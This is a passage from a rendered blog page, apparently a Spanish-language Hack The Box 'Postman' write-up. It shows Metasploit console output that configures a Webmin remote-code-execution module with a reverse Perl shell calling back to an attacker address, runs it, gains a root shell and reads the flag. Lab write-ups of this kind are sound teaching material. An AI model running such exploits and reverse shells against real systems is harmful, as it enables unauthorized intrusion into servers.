identifier</span><br><span class="line">   RPORT      <span class="number">10000</span>            yes       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">true</span>             no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /                yes       Base path <span class="keyword">for</span> Webmin application</span><br><span class="line">   USERNAME   Matt             yes       Webmin Username</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/reverse_perl):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  <span class="number">10.10</span><span class="number">.14</span><span class="number">.11</span>      yes       The listen address (an <span class="keyword">interface</span> may be specified)</span><br><span class="line">   LPORT  <span class="number">4444</span>             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   <span class="number">0</span>   Webmin &lt;= <span class="number">1.910</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/rce_webmin) &gt;</span><br></pre></td></tr></table></figure>
+
+<p>No olvidemos poner <code>ssl true</code> debido a que el sitio utiliza https.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">msf5 <span class="title">exploit</span><span class="params">(windows/rce_webmin)</span> &gt; exploit</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[*] Started reverse TCP handler on 10.10.14.11:4444 </span></span><br><span class="line"><span class="function">[+] Session cookie: 1cc00144dfe9f5e655315be15be093d8</span></span><br><span class="line"><span class="function">[*] Attempting to execute the payload...</span></span><br><span class="line"><span class="function">[*] Command shell session 1 <span class="title">opened</span> <span class="params">(<span class="number">10.10</span><span class="number">.14</span><span class="number">.11</span>:<span class="number">4444</span> -&gt; <span class="number">10.10</span><span class="number">.10</span><span class="number">.160</span>:<span class="number">50304</span>)</span> at 2020-03-14 17:00:11 -0500</span></span><br><span class="line"><span class="function">id</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">uid</span>=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line">cat /root/root.txt</span><br><span class="line">a257741c5bed8be7778c6ed95686ddce</span><br></pre></td></tr></table></figure>
+        </div>
+<!--
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>xxmeshxx</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://xxmeshxx.github.io/2020/03/14/postman/">http://xxmeshxx.github.io/2020/03/14/postman/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                 -->
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/03/13/Utils/">Utils</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© xxmeshxx | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
